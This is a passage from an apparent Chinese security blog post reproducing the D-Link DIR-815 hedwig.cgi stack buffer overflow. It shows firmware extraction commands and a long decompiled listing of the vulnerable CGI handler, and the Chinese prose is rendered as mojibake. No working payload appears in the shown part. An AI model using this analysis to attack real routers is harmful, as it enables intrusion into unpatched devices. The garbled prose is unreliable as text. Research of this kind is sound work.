<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Thir0th"><meta name="copyright" content="Thir0th"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>DIR-815æ¼æ´å¤ç° | Thir0th's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"www.thir0th.xyz","root":"/","title":"ä¸”è¡Œä¸”å¿˜ä¸”éšé£","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="DIR-815æ¼æ´å¤ç°">
<meta property="og:type" content="article">
<meta property="og:title" content="DIR-815æ¼æ´å¤ç°">
<meta property="og:url" content="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Thir0th&#39;s Blog">
<meta property="og:description" content="DIR-815æ¼æ´å¤ç°">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/dL5cTaJPbD1s6SI.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/fFZXYv2eVouAKOB.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/gSOcRiX7GE9Ptwy.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/hxsnNQ3CGOiJa65.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/M46GJC5ljxdwPum.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/JklKctPDY9o316X.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/7JuhMRvec3nsLOq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/9EP8C5nbxw1kN2s.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/mdaJZQGRfqxINB5.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Dw9IW2u7yEFzphx.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Fz97VW3J2osjtch.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OR49Ba82KVeoWk1.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/iTPwgZ4tdMxH6Uq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OtCNcwfEqjxevDS.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/OaSB1Aeinbys27d.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/6NthXGRgPoWkmq1.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/jXNTEeFgmsRuVq3.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/tQCJhLwnicBfbMV.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/N8qlbJ4EGxBaOjW.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/p15ULvBMFEmdVwJ.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/yPhiwu59nTZzDIq.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/bWHFCARkmw8GtMh.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/e8sy2A41lq5aMwK.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/njFp7cTJSz1YeVE.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/Pk1n74aKVmFojlc.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/owAgE8zf9BLMKqn.png">
<meta property="og:image" content="https://s2.loli.net/2025/06/25/KJo8Azvmh6uCiwR.png">
<meta property="article:published_time" content="2025-06-25T13:27:35.000Z">
<meta property="article:modified_time" content="2025-06-25T13:28:56.897Z">
<meta property="article:author" content="Thir0th">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Thir0th"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Thir0th"><span class="site-author-status" title="äººç”Ÿå¦‚æˆ">ğŸ§</span></a><div class="site-author-name"><a href="/about/">Thir0th</a></div><span class="site-name">Thir0th's Blog</span><sub class="site-subtitle"></sub><div class="site-description">ä¸”è¡Œä¸”å¿˜ä¸”éšé£</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="æ–‡æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">DIR-815æ¼æ´å¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">å›ºä»¶åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">æ¼æ´ç‚¹åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%94%A8%E6%88%B7%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.3.</span> <span class="toc-text">qemuç”¨æˆ·æ€æ¨¡æ‹Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5gdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">ç›´æ¥gdbè°ƒè¯•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">è„šæœ¬è°ƒè¯•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%B3%BB%E7%BB%9F%E6%80%81%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.4.</span> <span class="toc-text">qemuç³»ç»Ÿæ€æ¨¡æ‹Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1-%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E5%86%85%E6%A0%B8-%E9%95%9C%E5%83%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">step1 ä¸‹è½½å¯¹åº”å†…æ ¸+é•œåƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2-%E5%88%9B%E5%BB%BA%E7%BD%91%E6%A1%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">step2 åˆ›å»ºç½‘æ¡¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3-%E9%85%8D%E7%BD%AEqemu%E7%BD%91%E7%BB%9C"><span class="toc-number">1.4.3.</span> <span class="toc-text">step3 é…ç½®qemuç½‘ç»œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step4-%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.4.4.</span> <span class="toc-text">step4 è¿œç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">è¿œç¨‹è°ƒè¯•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">è¿œç¨‹æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%90%91-QEMU-%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E4%BC%A0-payload"><span class="toc-number">1.4.4.2.1.</span> <span class="toc-text">æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%90%91-httpd-%E6%9C%8D%E5%8A%A1%E5%8F%91%E9%80%81-HTTP-%E6%8A%A5%E6%96%87"><span class="toc-number">1.4.4.2.2.</span> <span class="toc-text">æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%80%E5%87%BA%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.</span> <span class="toc-text">é€€å‡ºä»¿çœŸç¯å¢ƒ</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://www.thir0th.xyz/2025/06/25/2025-06-25-DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Thir0th"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Thir0th's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DIR-815æ¼æ´å¤ç°</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2025-06-25 21:27:35" itemprop="dateCreated datePublished" datetime="2025-06-25T21:27:35+08:00">2025-06-25</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Router/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Router</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/IOT/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">IOT</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><span id="more"></span>

<h1 id="DIR-815æ¼æ´å¤ç°"><a href="#DIR-815æ¼æ´å¤ç°" class="headerlink" title="DIR-815æ¼æ´å¤ç°"></a>DIR-815æ¼æ´å¤ç°</h1><h2 id="å›ºä»¶åˆ†æ"><a href="#å›ºä»¶åˆ†æ" class="headerlink" title="å›ºä»¶åˆ†æ"></a>å›ºä»¶åˆ†æ</h2><p>ç¡®å®šå›ºä»¶æ¶æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">file busybox</span><br></pre></td></tr></table></figure>

<p>binwalkåˆ†ç¦»å›ºä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me file</span><br></pre></td></tr></table></figure>

<p>mipsropä¸‹è½½ï¼Œida9.0ç‰ˆæœ¬</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/XiDPPython/article/details/148194489?spm=1001.2014.3001.5501">IDAæ’ä»¶ MIPSROPçš„å®‰è£…å’Œä½¿ç”¨æ–¹æ³•_ida mips-CSDNåšå®¢</a></p>
<h2 id="æ¼æ´ç‚¹åˆ†æ"><a href="#æ¼æ´ç‚¹åˆ†æ" class="headerlink" title="æ¼æ´ç‚¹åˆ†æ"></a>æ¼æ´ç‚¹åˆ†æ</h2><p>å®˜æ–¹æ¼æ´æ‰¹æ¼ï¼š<a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625</a></p>
<p><img src="https://s2.loli.net/2025/06/25/NXPMpyYfmH8kagV.png" alt="image" loading="lazy"></p>
<p>å®˜æ–¹çš„æ¼æ´æŠ¥å‘Šä¸­åªæåŠäº†DIR-645å‹å·çš„hedwig.cgiä¸­ä¼šå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´ï¼Œå…¶å®D-Linkçš„DIR-815&#x2F;300&#x2F;600&#x2F;645ç­‰å‹å·éƒ½å­˜åœ¨è¿™ä¸ªæ¼æ´</p>
<p>æ ¹æ®æ¼æ´æè¿°ï¼Œå¯çŸ¥æ¼æ´ç‚¹åœ¨hedwig.cgiï¼ŒåŒæ—¶è¿™ä¸ªæ–‡ä»¶æŒ‡å‘&#x2F;htdocs&#x2F;cgibinï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><img src="https://s2.loli.net/2025/06/25/dL5cTaJPbD1s6SI.png" alt="image" loading="lazy"></p>
<p>mainä¸­å®šä½ä¸»è¦å‡½æ•°</p>
<p><img src="https://s2.loli.net/2025/06/25/fFZXYv2eVouAKOB.png" alt="image" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">// å‡½æ•°å…¥å£ï¼Œä¿å­˜å¯„å­˜å™¨ï¼Œåˆ†é…æ ˆç©ºé—´ï¼Œåˆå§‹åŒ–å±€éƒ¨å˜é‡ã€‚</span><br><span class="line">int hedwigcgi_main()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // $v0</span><br><span class="line">  const char *no_REQUEST; // $a1</span><br><span class="line">  FILE *stream; // $s0</span><br><span class="line">  int v3; // $fp</span><br><span class="line">  int v4; // $s5</span><br><span class="line">  int v5; // $v0</span><br><span class="line">  const char *string; // $v0</span><br><span class="line">  FILE *stream_1; // $s2</span><br><span class="line">  int fd; // $v0</span><br><span class="line">  int v9; // $s7</span><br><span class="line">  int fd_1; // $v0</span><br><span class="line">  char **v11; // $s1</span><br><span class="line">  int i; // $s3</span><br><span class="line">  char *v13; // $v0</span><br><span class="line">  const char **v14; // $s1</span><br><span class="line">  int v15; // $s0</span><br><span class="line">  char *v16; // $v0</span><br><span class="line">  const char **v17; // $s1</span><br><span class="line">  int v18; // $s0</span><br><span class="line">  int fd_2; // $v0</span><br><span class="line">  const char *v20; // $v0</span><br><span class="line">  char _runtime_session[20]; // [sp+18h] [-4A8h] BYREF</span><br><span class="line">  char *s_2; // [sp+2Ch] [-494h] BYREF</span><br><span class="line">  char *v24; // [sp+30h] [-490h]</span><br><span class="line">  _DWORD v25[3]; // [sp+34h] [-48Ch] BYREF</span><br><span class="line">  char s_1[128]; // [sp+40h] [-480h] BYREF</span><br><span class="line">  char s[1024]; // [sp+C0h] [-400h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));                      // memset(s, 0, sizeof(s)); åˆå§‹åŒ–1024å­—èŠ‚ç¼“å†²åŒºsä¸º0ã€‚</span><br><span class="line">  memset(s_1, 0, sizeof(s_1));                  // memset(s_1, 0, sizeof(s_1)); åˆå§‹åŒ–128å­—èŠ‚ç¼“å†²åŒºs_1ä¸º0ã€‚</span><br><span class="line">  strcpy(_runtime_session, &quot;/runtime/session&quot;); // strcpy(_runtime_session, &quot;/runtime/session&quot;); æ‹·è´å­—ç¬¦ä¸²åˆ°_runtime_sessionã€‚</span><br><span class="line">  v0 = getenv(&quot;REQUEST_METHOD&quot;);                // v0 = getenv(&quot;REQUEST_METHOD&quot;); è·å–ç¯å¢ƒå˜é‡REQUEST_METHODï¼Œåˆ¤æ–­HTTPè¯·æ±‚ç±»å‹ã€‚</span><br><span class="line">  if ( !v0 )                                    // if (!v0) æ£€æŸ¥REQUEST_METHODæ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›é”™è¯¯ã€‚</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no REQUEST&quot;;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = -1;</span><br><span class="line">    goto LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcasecmp(v0, &quot;POST&quot;) )                 // if (strcasecmp(v0, &quot;POST&quot;)) æ£€æŸ¥æ˜¯å¦ä¸ºPOSTè¯·æ±‚ï¼ŒéPOSTåˆ™è¿”å›é”™è¯¯ã€‚</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unsupported HTTP request&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, 0, 0x20000); // cgibin_parse_request(sub_409A6C, 0, 0x20000); è§£æCGIè¯·æ±‚æ•°æ®ã€‚</span><br><span class="line">  stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;);// stream = fopen(&quot;/etc/config/image_sign&quot;, &quot;r&quot;); æ‰“å¼€ç­¾åé…ç½®æ–‡ä»¶ã€‚</span><br><span class="line">  if ( !fgets(s_1, 128, stream) )               // if (!fgets(s_1, 128, stream)) è¯»å–ç­¾åå†…å®¹ï¼Œå¤±è´¥åˆ™è¿”å›é”™è¯¯ã€‚</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to read signature!&quot;;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);                               // fclose(stream); å…³é—­ç­¾åæ–‡ä»¶ã€‚</span><br><span class="line">  cgibin_reatwhite(s_1);                        // cgibin_reatwhite(s_1); å»é™¤ç­¾åå­—ç¬¦ä¸²ä¸­çš„ç©ºç™½å­—ç¬¦ã€‚</span><br><span class="line">  v4 = sobj_new();                              // v4 = sobj_new(); åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡v4ã€‚</span><br><span class="line">  v5 = sobj_new();                              // v5 = sobj_new(); åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡v5ã€‚</span><br><span class="line">  v3 = v5;</span><br><span class="line">  if ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to allocate string object&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  sess_get_uid(v4);                             // sess_get_uid(v4); è·å–å½“å‰ä¼šè¯çš„UIDã€‚</span><br><span class="line">  string = (const char *)sobj_get_string(v4);   // string = (const char *)sobj_get_string(v4); è·å–UIDå­—ç¬¦ä¸²ã€‚</span><br><span class="line">  sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string);// sprintf(s, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string); ç”Ÿæˆpostxmlè·¯å¾„ã€‚</span><br><span class="line">  xmldbc_del(0, 0, s);                          // xmldbc_del(0, 0, s); åˆ é™¤æ—§çš„postxmlèŠ‚ç‚¹ã€‚</span><br><span class="line">  stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;);   // stream_1 = fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;); åˆ›å»ºä¸´æ—¶XMLæ–‡ä»¶ç”¨äºå†™å…¥ã€‚</span><br><span class="line">  if ( !stream_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;unable to open temp file.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !haystack )                              // if (!haystack) æ£€æŸ¥XMLæ•°æ®æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è¿”å›é”™è¯¯ã€‚</span><br><span class="line">  &#123;</span><br><span class="line">    no_REQUEST = &quot;no xml data.&quot;;</span><br><span class="line">    goto LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  fd = fileno(stream_1);                        // fd = fileno(stream_1); è·å–æ–‡ä»¶æè¿°ç¬¦ã€‚</span><br><span class="line">  v9 = lockf(fd, 3, 0);                         // v9 = lockf(fd, 3, 0); å°è¯•å¯¹æ–‡ä»¶åŠ é”ï¼Œé˜²æ­¢å¹¶å‘å†™å…¥ã€‚</span><br><span class="line">  if ( v9 &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(</span><br><span class="line">      &quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;,</span><br><span class="line">      0);</span><br><span class="line">    v9 = 0;</span><br><span class="line">    goto LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  fd_1 = fileno(stream_1);                      // fd_1 = fileno(stream_1); å†æ¬¡è·å–æ–‡ä»¶æè¿°ç¬¦ã€‚</span><br><span class="line">  lockf(fd_1, 1, 0);</span><br><span class="line">  s_2 = s_1;</span><br><span class="line">  v24 = 0;</span><br><span class="line">  memset(v25, 0, sizeof(v25));</span><br><span class="line">  v24 = strtok(_runtime_session, &quot;/&quot;);</span><br><span class="line">  v11 = (char **)v25;</span><br><span class="line">  for ( i = 2; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(0, &quot;/&quot;);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    if ( !v13 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;s_2)[i] = (char *)sobj_get_string(v4);</span><br><span 